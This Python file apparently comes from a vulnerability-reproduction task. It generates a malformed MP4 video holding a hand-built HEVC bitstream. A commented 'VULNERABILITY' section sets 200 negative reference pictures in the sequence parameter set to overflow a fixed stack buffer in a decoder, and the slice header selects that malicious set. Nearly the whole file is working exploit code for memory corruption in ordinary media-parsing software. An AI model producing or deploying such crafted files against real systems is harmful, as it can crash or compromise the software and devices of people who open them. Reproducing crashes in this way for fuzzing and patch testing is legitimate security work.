import struct

class BitWriter:
    def __init__(self):
        self.data = bytearray()
        self.val = 0
        self.bits = 0

    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            bit = (value >> i) & 1
            self.val = (self.val << 1) | bit
            self.bits += 1
            if self.bits == 8:
                self.data.append(self.val)
                self.val = 0
                self.bits = 0

    def write_ue(self, value):
        if value == 0:
            self.write_bits(1, 1)
        else:
            tmp = value + 1
            length = tmp.bit_length() - 1
            self.write_bits(0, length)
            self.write_bits(1, 1)
            self.write_bits(tmp - (1 << length), length)

    def write_se(self, value):
        if value <= 0:
            self.write_ue(-2 * value)
        else:
            self.write_ue(2 * value - 1)

    def write_align(self):
        if self.bits > 0:
            self.write_bits(1, 1)
            while self.bits > 0:
                self.write_bits(0, 1)

    def get_bytes(self):
        return bytes(self.data)

def escape(data):
    out = bytearray()
    zeros = 0
    for b in data:
        if zeros >= 2 and b <= 3:
            out.append(3)
            zeros = 0
        out.append(b)
        if b == 0:
            zeros += 1
        else:
            zeros = 0
    return bytes(out)

class Solution:
    def solve(self, src_path: str) -> bytes:
        # 1. VPS
        bs_vps = BitWriter()
        bs_vps.write_bits(0x4001, 16) # NAL type 32
        bs_vps.write_bits(0, 4) # vps_id
        bs_vps.write_bits(3, 2)
        bs_vps.write_bits(0, 6)
        bs_vps.write_bits(0, 3)
        bs_vps.write_bits(1, 1) # nesting
        bs_vps.write_bits(0xffff, 16)
        bs_vps.write_bits(0, 2); bs_vps.write_bits(0, 1); bs_vps.write_bits(1, 5) # Profile Main
        bs_vps.write_bits(0x60000000, 32) # Compat flags
        bs_vps.write_bits(0b1011 << 44, 48) # Constraints
        bs_vps.write_bits(30, 8) # Level
        bs_vps.write_bits(1, 1) # sub layer ordering
        bs_vps.write_ue(0); bs_vps.write_ue(0); bs_vps.write_ue(0)
        bs_vps.write_bits(0, 6); bs_vps.write_ue(0); bs_vps.write_bits(0, 1); bs_vps.write_bits(0, 1)
        bs_vps.write_align()
        vps_data = escape(bs_vps.get_bytes())

        # 2. SPS
        bs_sps = BitWriter()
        bs_sps.write_bits(0x4201, 16) # NAL type 33
        bs_sps.write_bits(0, 4) # vps_id
        bs_sps.write_bits(0, 3) # max_sub_layers
        bs_sps.write_bits(1, 1) # nesting
        bs_sps.write_bits(0, 2); bs_sps.write_bits(0, 1); bs_sps.write_bits(1, 5)
        bs_sps.write_bits(0x60000000, 32)
        bs_sps.write_bits(0b1011 << 44, 48)
        bs_sps.write_bits(30, 8)
        bs_sps.write_ue(0) # sps_id
        bs_sps.write_ue(1) # chroma
        bs_sps.write_ue(64); bs_sps.write_ue(64)
        bs_sps.write_bits(0, 1)
        bs_sps.write_ue(0); bs_sps.write_ue(0)
        bs_sps.write_ue(4) # log2_max_poc_lsb - 4
        bs_sps.write_bits(0, 1)
        bs_sps.write_ue(0); bs_sps.write_ue(0); bs_sps.write_ue(0)
        bs_sps.write_ue(0); bs_sps.write_ue(0); bs_sps.write_ue(0); bs_sps.write_ue(0)
        bs_sps.write_ue(0); bs_sps.write_ue(0)
        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
        
        # VULNERABILITY: num_short_term_ref_pic_sets = 1
        bs_sps.write_ue(1) 
        # rps 0
        # num_negative_pics = 200 (Overflows fixed stack buffer)
        bs_sps.write_ue(200) 
        bs_sps.write_ue(0) # num_positive_pics
        for _ in range(200):
            bs_sps.write_ue(0)
            bs_sps.write_bits(1, 1)
            
        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
        bs_sps.write_align()
        sps_data = escape(bs_sps.get_bytes())

        # 3. PPS
        bs_pps = BitWriter()
        bs_pps.write_bits(0x4401, 16) # NAL type 34
        bs_pps.write_ue(0); bs_pps.write_ue(0)
        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 3)
        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
        bs_pps.write_ue(0); bs_pps.write_ue(0); bs_pps.write_se(0)
        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
        bs_pps.write_ue(0); bs_pps.write_se(0); bs_pps.write_se(0)
        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
        bs_pps.write_align()
        pps_data = escape(bs_pps.get_bytes())

        # 4. Slice
        bs_sl = BitWriter()
        bs_sl.write_bits(0x0201, 16) # NAL type 1
        bs_sl.write_bits(1, 1) # first_slice
        bs_sl.write_ue(0) # pps_id
        bs_sl.write_ue(0) # slice_type B
        bs_sl.write_bits(0, 8) # pic_order_cnt_lsb
        bs_sl.write_bits(1, 1) # short_term_ref_pic_set_sps_flag = 1
        bs_sl.write_ue(0) # short_term_ref_pic_set_idx = 0 (the malicious one)
        bs_sl.write_ue(0); bs_sl.write_bits(0, 1)
        bs_sl.write_bits(0, 1); bs_sl.write_bits(0, 1); bs_sl.write_bits(0, 1)
        bs_sl.write_ue(0)
        bs_sl.write_align()
        slice_nal = escape(bs_sl.get_bytes())
        
        sample = struct.pack(">I", len(slice_nal)) + slice_nal

        # hvcC content
        hvcc = bytearray([1, 1]) + struct.pack(">I", 0x60000000) + struct.pack(">Q", 0b1011 << 44)[2:] + b'\x1e\xf0\x00\xfc\xfd\xf8\xf8\x00\x00\x0f\x03'
        hvcc.append(0x80 | 32); hvcc.extend(struct.pack(">H", 1)); hvcc.extend(struct.pack(">H", len(vps_data))); hvcc.extend(vps_data)
        hvcc.append(0x80 | 33); hvcc.extend(struct.pack(">H", 1)); hvcc.extend(struct.pack(">H", len(sps_data))); hvcc.extend(sps_data)
        hvcc.append(0x80 | 34); hvcc.extend(struct.pack(">H", 1)); hvcc.extend(struct.pack(">H", len(pps_data))); hvcc.extend(pps_data)

        # Assemble MP4
        def box(t, d): return struct.pack(">I", 8+len(d)) + t + d
        
        ftyp = b'ftypisom\x00\x00\x02\x00isomiso2mp41'
        
        hvc1_entry = box(b"hvc1", b'\x00'*6 + b'\x00\x01' + b'\x00'*16 + struct.pack(">HH", 64, 64) + b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\x00'*4 + b'\x00\x01' + b'\x04path' + b'\x00'*27 + b'\x00\x18\xff\xff' + box(b"hvcC", hvcc))
        stsd = box(b"stsd", b'\x00'*4 + struct.pack(">I", 1) + hvc1_entry)
        stts = box(b"stts", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">II", 1, 1000))
        stsc = box(b"stsc", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))
        stsz = box(b"stsz", b'\x00'*4 + struct.pack(">I", 0) + struct.pack(">I", 1) + struct.pack(">I", len(sample)))
        
        # First pass with dummy stco to calc size
        stco_dummy = box(b"stco", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">I", 0))
        stbl = box(b"stbl", stsd + stts + stsc + stsz + stco_dummy)
        
        minf = box(b"minf", box(b"vmhd", b'\x00'*4 + b'\x00\x01\x00\x00\x00\x00\x00\x00') + box(b"dinf", box(b"dref", b'\x00'*4 + struct.pack(">I", 1) + box(b"url ", b'\x00'*4))) + stbl)
        mdia = box(b"mdia", box(b"mdhd", b'\x00'*4 + struct.pack(">II", 1000, 1000) + b'\x55\xc4\x00\x00') + box(b"hdlr", b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
        trak = box(b"trak", box(b"tkhd", b'\x00\x00\x00\x03' + struct.pack(">I", 0) + struct.pack(">I", 8) + b'\x00'*20 + struct.pack(">II", 1000, 0) + b'\x00'*16 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">II", 64<<16, 64<<16)) + mdia)
        mvhd = box(b"mvhd", b'\x00'*4 + struct.pack(">II", 0, 0) + struct.pack(">II", 1000, 1000) + b'\x00\x01\x00\x00\x01\x00\x00\x00' + b'\x00'*8 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">I", 2))
        moov = box(b"moov", mvhd + trak)
        
        offset = len(ftyp) + len(moov) + 8
        
        # Second pass with real stco
        stco_real = box(b"stco", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">I", offset))
        stbl = box(b"stbl", stsd + stts + stsc + stsz + stco_real)
        minf = box(b"minf", box(b"vmhd", b'\x00'*4 + b'\x00\x01\x00\x00\x00\x00\x00\x00') + box(b"dinf", box(b"dref", b'\x00'*4 + struct.pack(">I", 1) + box(b"url ", b'\x00'*4))) + stbl)
        mdia = box(b"mdia", box(b"mdhd", b'\x00'*4 + struct.pack(">II", 1000, 1000) + b'\x55\xc4\x00\x00') + box(b"hdlr", b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
        trak = box(b"trak", box(b"tkhd", b'\x00\x00\x00\x03' + struct.pack(">I", 0) + struct.pack(">I", 8) + b'\x00'*20 + struct.pack(">II", 1000, 0) + b'\x00'*16 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">II", 64<<16, 64<<16)) + mdia)
        moov = box(b"moov", mvhd + trak)
        
        return ftyp + moov + box(b"mdat", sample)
